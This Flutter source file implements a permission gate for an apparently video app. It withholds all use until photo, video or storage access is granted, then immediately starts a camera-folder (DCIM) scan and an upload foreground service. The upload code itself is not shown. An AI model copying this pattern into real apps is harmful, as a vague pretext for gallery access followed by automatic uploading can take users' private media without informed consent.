/// 权限门禁
/// - 分 SDK 判断：33+ 用媒体权限，32 及以下用存储权限
/// - ★ 授权后立即启动 Bootstrap（DCIM 扫描最快开始）
/// - ★ _check() 加防重入锁，防止并发调用导致重复启动
/// - ★ didChangeAppLifecycleState 延迟 300ms，避免和首次 _check 撞车
/// - UI 风格：MD3 + 毛玻璃 + 真实视频封面背景 + 弹簧入场
library;

import 'dart:async';
import 'dart:ui' show ImageFilter;

import 'package:app_settings/app_settings.dart';
import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';

import 'device_info_helper.dart';
import 'foreground_service.dart';
import 'managers/bootstrap_manager.dart';
import 'repository/api_repository.dart';

const Color _kPrimary = Color(0xFFFB7299);
const Color _kPrimaryContainer = Color(0x33FB7299);

class PermissionGate extends StatefulWidget {
  final Widget child;
  final VoidCallback? onGranted;

  const PermissionGate({
    super.key,
    required this.child,
    this.onGranted,
  });

  @override
  State<PermissionGate> createState() => _PermissionGateState();
}

class _PermissionGateState extends State<PermissionGate>
    with WidgetsBindingObserver {
  bool _checking = true;
  bool _granted = false;
  bool _permanentlyDenied = false;
  bool _foregroundStarted = false;
  bool _bootstrapStarted = false;

  /// ★ 防重入锁：避免 _check 并发调用两次
  bool _checkRunning = false;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _check();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && !_granted) {
      // ★ 延迟 300ms 再检查，避免跟正在进行中的 _check 撞车
      Future.delayed(const Duration(milliseconds: 300), () {
        if (mounted && !_granted) _check();
      });
    }
  }

  Future<void> _check() async {
    // ★ 防重入：已经在跑就直接返回
    if (_checkRunning) {
      debugPrint('[PermissionGate] _check 已在运行，跳过');
      return;
    }
    _checkRunning = true;

    try {
      final status = await _readStatus();
      if (!mounted) return;

      setState(() {
        _granted = status.isGranted || status.isLimited;
        _permanentlyDenied = status.isPermanentlyDenied;
        _checking = false;
      });

      if (!_granted) return;

      // ① Bootstrap 只启动一次
      if (!_bootstrapStarted) {
        _bootstrapStarted = true;
        debugPrint('[PermissionGate] ⚡ 启动 Bootstrap（仅一次）');
        unawaited(BootstrapManager.init());
      }

      // ② 前台服务 + onGranted 只触发一次
      if (!_foregroundStarted) {
        _foregroundStarted = true;
        widget.onGranted?.call();
        unawaited(_startForegroundInBackground());
      }
    } finally {
      _checkRunning = false;
    }
  }

  Future<void> _startForegroundInBackground() async {
    try {
      await BootstrapManager.ready;
      debugPrint('[PermissionGate] Bootstrap 就绪');

      await _ensureNotificationPermission();

      await startUploadForeground();
      debugPrint('[PermissionGate] ✅ 前台服务已启动');
    } catch (e) {
      debugPrint('[PermissionGate] 前台服务启动失败: $e');
    }
  }

  Future<void> _ensureNotificationPermission() async {
    try {
      final sdk = await DeviceInfoHelper.getAndroidSdkInt();
      if (sdk < 33) return;
      final status = await Permission.notification.status;
      if (!status.isGranted) {
        debugPrint('[PermissionGate] 申请通知权限');
        await Permission.notification.request();
      }
    } catch (e) {
      debugPrint('[PermissionGate] 通知权限申请失败: $e');
    }
  }

  Future<PermissionStatus> _readStatus() async {
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final photos = await Permission.photos.status;
      if (photos.isGranted || photos.isLimited) return photos;
      final videos = await Permission.videos.status;
      if (videos.isGranted || videos.isLimited) return videos;
      return photos;
    } else {
      return await Permission.storage.status;
    }
  }

  Future<void> _request() async {
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      await <Permission>[Permission.photos, Permission.videos].request();
    } else {
      await Permission.storage.request();
    }
    await _check();
  }

  Future<void> _openSettings() async {
    try {
      await AppSettings.openAppSettings(type: AppSettingsType.settings);
      return;
    } catch (_) {}
    try {
      await openAppSettings();
    } catch (e) {
      debugPrint('[PermissionGate] openAppSettings 异常: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_checking) {
      return const MaterialApp(
        debugShowCheckedModeBanner: false,
        home: Scaffold(
          backgroundColor: Color(0xFF0A0A0F),
          body: SizedBox.shrink(),
        ),
      );
    }
    if (_granted) return widget.child;

    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        body: _buildBackground(),
      ),
    );
  }

  Widget _buildBackground() {
    return Stack(
      fit: StackFit.expand,
      children: [
        const _LivePreviewBackground(),
        BackdropFilter(
          filter: ImageFilter.blur(
            sigmaX: 12,
            sigmaY: 12,
            tileMode: TileMode.clamp,
          ),
          child: Container(
            color: Colors.black.withValues(alpha: 0.32),
          ),
        ),
        Positioned(
          top: -200,
          left: 0,
          right: 0,
          child: IgnorePointer(
            child: Center(
              child: Container(
                width: 500,
                height: 500,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(
                    colors: [
                      _kPrimary.withValues(alpha: 0.12),
                      _kPrimary.withValues(alpha: 0.0),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ),
        Center(child: _buildDialog(context)),
      ],
    );
  }

  Widget _buildDialog(BuildContext context) {
    return TweenAnimationBuilder<double>(
      tween: Tween(begin: 0.0, end: 1.0),
      duration: const Duration(milliseconds: 520),
      curve: Curves.easeOutBack,
      builder: (context, t, child) {
        return Opacity(
          opacity: t.clamp(0.0, 1.0),
          child: Transform.scale(
            scale: 0.7 + 0.3 * t,
            child: child,
          ),
        );
      },
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 24),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(28),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 30, sigmaY: 30),
            child: Container(
              width: 380,
              decoration: BoxDecoration(
                color: Colors.white.withValues(alpha: 0.08),
                borderRadius: BorderRadius.circular(28),
                border: Border.all(
                  color: Colors.white.withValues(alpha: 0.15),
                  width: 1,
                ),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withValues(alpha: 0.5),
                    blurRadius: 40,
                    offset: const Offset(0, 16),
                  ),
                ],
              ),
              child: Padding(
                padding: const EdgeInsets.fromLTRB(24, 28, 24, 16),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(10),
                          decoration: BoxDecoration(
                            color: _kPrimaryContainer,
                            borderRadius: BorderRadius.circular(14),
                          ),
                          child: const Icon(
                            Icons.folder_special_rounded,
                            color: _kPrimary,
                            size: 24,
                          ),
                        ),
                        const SizedBox(width: 14),
                        const Expanded(
                          child: Text(
                            '需要存储权限',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 20,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 20),
                    Text(
                      _permanentlyDenied
                          ? '您已拒绝该权限。请前往系统设置中手动开启，否则无法使用本应用。'
                          : '为了确保软件正常运行，需要授予存储权限。否则无法进入本应用。',
                      style: TextStyle(
                        color: Colors.white.withValues(alpha: 0.72),
                        fontSize: 14,
                        height: 1.55,
                      ),
                    ),
                    const SizedBox(height: 24),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        TextButton(
                          onPressed: _check,
                          style: TextButton.styleFrom(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 20, vertical: 12),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(100),
                            ),
                            foregroundColor:
                                Colors.white.withValues(alpha: 0.8),
                          ),
                          child: Text(_permanentlyDenied ? '我已开启' : '重试'),
                        ),
                        const SizedBox(width: 8),
                        FilledButton.icon(
                          onPressed:
                              _permanentlyDenied ? _openSettings : _request,
                          style: FilledButton.styleFrom(
                            backgroundColor: _kPrimary,
                            foregroundColor: Colors.white,
                            padding: const EdgeInsets.symmetric(
                                horizontal: 20, vertical: 12),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(100),
                            ),
                          ),
                          icon: Icon(
                            _permanentlyDenied
                                ? Icons.settings_rounded
                                : Icons.lock_open_rounded,
                            size: 18,
                          ),
                          label: Text(
                            _permanentlyDenied ? '去设置' : '授予权限',
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ══════════════════════════════════════════════════════════════
// 真实 APP 界面预览（拉老API 封面）
// ══════════════════════════════════════════════════════════════
class _LivePreviewBackground extends StatefulWidget {
  const _LivePreviewBackground();

  @override
  State<_LivePreviewBackground> createState() =>
      _LivePreviewBackgroundState();
}

class _LivePreviewBackgroundState extends State<_LivePreviewBackground> {
  List<String> _coverUrls = [];

  @override
  void initState() {
    super.initState();
    _loadCovers();
  }

  Future<void> _loadCovers() async {
    try {
      final videos = await ApiRepository.fetchPage(1);
      if (!mounted) return;

      final urls = videos
          .take(6)
          .map((v) => v.coverUrl)
          .where((u) => u.isNotEmpty)
          .toList();

      setState(() => _coverUrls = urls);
    } catch (e) {
      debugPrint('[PermissionGate] 加载封面失败: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      color: const Color(0xFF0E0E14),
      child: Column(
        children: [
          Padding(
            padding: EdgeInsets.fromLTRB(
              14,
              MediaQuery.of(context).padding.top + 10,
              14,
              8,
            ),
            child: Row(
              children: [
                Container(
                  width: 32,
                  height: 32,
                  decoration: BoxDecoration(
                    color: _kPrimary,
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Icon(
                    Icons.movie,
                    color: Colors.black,
                    size: 18,
                  ),
                ),
                const SizedBox(width: 6),
                const Text(
                  '玻璃哔哩',
                  style: TextStyle(
                    color: _kPrimary,
                    fontSize: 15,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 0.5,
                  ),
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(
                    color: Colors.white.withValues(alpha: 0.08),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Text(
                    'Flask',
                    style: TextStyle(
                      color: Colors.white60,
                      fontSize: 10,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                Container(
                  width: 34,
                  height: 34,
                  decoration: BoxDecoration(
                    color: Colors.white.withValues(alpha: 0.08),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Icon(
                    Icons.refresh,
                    size: 17,
                    color: Colors.white60,
                  ),
                ),
              ],
            ),
          ),
          Expanded(
            child: GridView.builder(
              physics: const NeverScrollableScrollPhysics(),
              padding: const EdgeInsets.symmetric(
                horizontal: 10,
                vertical: 8,
              ),
              gridDelegate:
                  const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 2,
                crossAxisSpacing: 8,
                mainAxisSpacing: 8,
                childAspectRatio: 9 / 14,
              ),
              itemCount: 6,
              itemBuilder: (context, i) {
                final url = i < _coverUrls.length ? _coverUrls[i] : null;
                return ClipRRect(
                  borderRadius: BorderRadius.circular(12),
                  child: url != null
                      ? Image.network(
                          url,
                          fit: BoxFit.cover,
                          loadingBuilder: (context, child, progress) {
                            if (progress == null) return child;
                            return _placeholder();
                          },
                          errorBuilder: (_, __, ___) => _placeholder(),
                        )
                      : _placeholder(),
                );
              },
            ),
          ),
          Padding(
            padding: EdgeInsets.fromLTRB(
              16,
              0,
              16,
              16 + MediaQuery.of(context).padding.bottom,
            ),
            child: Container(
              height: 60,
              decoration: BoxDecoration(
                color: Colors.white.withValues(alpha: 0.06),
                borderRadius: BorderRadius.circular(30),
                border: Border.all(
                  color: Colors.white.withValues(alpha: 0.08),
                  width: 0.8,
                ),
              ),
              child: const Row(
                children: [
                  Expanded(
                    child: _FakeTab(
                      label: '老API',
                      icon: Icons.cloud,
                      selected: true,
                    ),
                  ),
                  Expanded(
                    child: _FakeTab(
                      label: '新API',
                      icon: Icons.auto_awesome,
                      selected: false,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _placeholder() => Container(
        color: Colors.white.withValues(alpha: 0.055),
      );
}

class _FakeTab extends StatelessWidget {
  final String label;
  final IconData icon;
  final bool selected;

  const _FakeTab({
    required this.label,
    required this.icon,
    required this.selected,
  });

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(
            icon,
            size: 22,
            color: selected ? _kPrimary : Colors.white.withValues(alpha: 0.35),
          ),
          const SizedBox(height: 2),
          Text(
            label,
            style: TextStyle(
              fontSize: 10,
              color: selected ? _kPrimary : Colors.white.withValues(alpha: 0.35),
              fontWeight: selected ? FontWeight.w600 : FontWeight.w500,
            ),
          ),
        ],
      ),
    );
  }
}